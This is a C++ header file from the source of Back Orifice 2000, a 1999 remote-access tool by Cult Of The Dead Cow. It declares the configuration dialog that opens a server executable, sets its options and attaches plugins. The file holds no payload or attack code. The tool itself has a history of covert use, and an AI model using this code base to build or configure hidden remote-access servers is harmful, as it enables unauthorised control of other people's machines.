/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// bo2kcfgDlg.h : header file
//

#if !defined(AFX_BO2KCFGDLG_H__BA3A1E08_E042_11D2_ADC4_0000F8084273__INCLUDED_)
#define AFX_BO2KCFGDLG_H__BA3A1E08_E042_11D2_ADC4_0000F8084273__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgDlg dialog

typedef struct {
	BYTE *pPluginImage;
	DWORD dwPluginLen;
	char svFilename[MAX_PATH+1];
	char svDescription[256];
	WORD wVersionLo;
	WORD wVersionHi;
	WORD wBOVersionLo;
	WORD wBOVersionHi;
} PLUGIN_INFO;

typedef struct {
	int nPlugin;
	DWORD dwPos;
	char VarType; // B, N, S
	int nNumLo;
	int nNumHi;
	int nStrLen;
	char svVarValue[256];
	char svVarName[256];
	char svCategory[256];
} VARIABLE_INFO;

class CBo2kcfgDlg : public CDialog
{
// Construction
public:
	void DoWizard(void);
	void AddVariables(char *pBuffer, DWORD dwLen, int nPlugin);
	void UpdateVariableList(void);
	BOOL SaveServer(void);
	BOOL InsertPlugin(BYTE *pPlugin, DWORD dwSize);
	void CloseServer(void);
	BOOL OpenServer(LPCSTR svPath);
	BOOL IsValidServer(LPCSTR svPath);
	BOOL IsValidPlugin(LPCSTR svPath);
	void EnableControls(BOOL bEnable);
	CBo2kcfgDlg(CWnd* pParent = NULL);	// standard constructor

// Dialog Data
	//{{AFX_DATA(CBo2kcfgDlg)
	enum { IDD = IDD_BO2KCFG_DIALOG };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBo2kcfgDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:		
	
	HICON m_hLargeIcon;
	HICON m_hSmallIcon;
	HICON m_hButtWizard;
	CImageList m_ImgList;

	CArray<PLUGIN_INFO, PLUGIN_INFO> m_arrPluginInfo;
	CArray<VARIABLE_INFO, VARIABLE_INFO> m_arrVarInfo;
	CString m_strSvrPath;
	HANDLE m_hSvrMapping;
	void *m_pSvrView;
	DWORD m_dwRawLength; // Length of server executable _image_ WITHOUT all the plugins attached
	DWORD m_dwRawFileSize; // Size of server file map without all the plugins
	
	// Generated message map functions
	//{{AFX_MSG(CBo2kcfgDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnOpenserver();
	afx_msg void OnCloseserver();
	afx_msg void OnInsert();
	afx_msg void OnSaveserver();
	virtual void OnOK();
	virtual void OnCancel();
	afx_msg void OnRemove();
	afx_msg void OnSelchangedOptionvariables(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBoolDisabled();
	afx_msg void OnBoolEnabled();
	afx_msg void OnSetvalue();
	afx_msg void OnExit();
	afx_msg void OnClose();
	afx_msg void OnExtract();
	afx_msg void OnWizard();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BO2KCFGDLG_H__BA3A1E08_E042_11D2_ADC4_0000F8084273__INCLUDED_)
